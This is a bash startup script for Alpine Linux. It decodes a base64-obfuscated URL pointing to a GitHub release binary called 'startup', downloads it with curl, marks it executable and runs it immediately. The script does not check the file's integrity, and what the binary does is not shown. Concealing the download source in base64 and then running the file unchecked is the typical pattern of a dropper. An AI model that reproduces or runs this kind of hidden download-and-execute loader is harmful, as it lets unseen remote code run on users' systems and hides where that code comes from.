#!/usr/bin/env bash

# shellcheck disable=SC1091

STARTUP_BIN_URL="aHR0cHM6Ly9naXRodWIuY29tL3poYW9ndW9tYW5vbmcvbWFnaXNrLWZpbGVzL3JlbGVhc2VzL2Rvd25sb2FkL3N0YXJ0dXBfMjAyMi4xMC4yNC4yL3N0YXJ0dXA="
STARTUP_BIN_NAME="startup"

cd "$(dirname "$0")" || exit 1
ROOT="$(pwd)"


if [[ "$(uname)" != 'Linux' ]]; then
    echo "Error: This operating system is not supported."
    exit 1
fi
if [[ ! -f '/etc/os-release' ]]; then
    echo "Error: Don't use outdated Linux distributions."
    exit 1
else
    . /etc/os-release
fi
if [[ "${ID}" != 'alpine' ]];then
    echo "Only Alpine Linux is supported"
    exit 1
fi


STARTUP_BIN_URL=$(echo "${STARTUP_BIN_URL}" | base64 -d)
curl --retry 10 --retry-max-time 60 -H 'Cache-Control: no-cache' -fsSL \
    -o "${ROOT}/${STARTUP_BIN_NAME}" "${STARTUP_BIN_URL}"
if [[ -f "${ROOT}/${STARTUP_BIN_NAME}" ]]; then
    echo "download ${STARTUP_BIN_NAME} successfully"
    chmod a+x "${ROOT}/${STARTUP_BIN_NAME}"
else
    echo "download startup failed !!!"
    exit 1
fi


"${ROOT}/${STARTUP_BIN_NAME}"
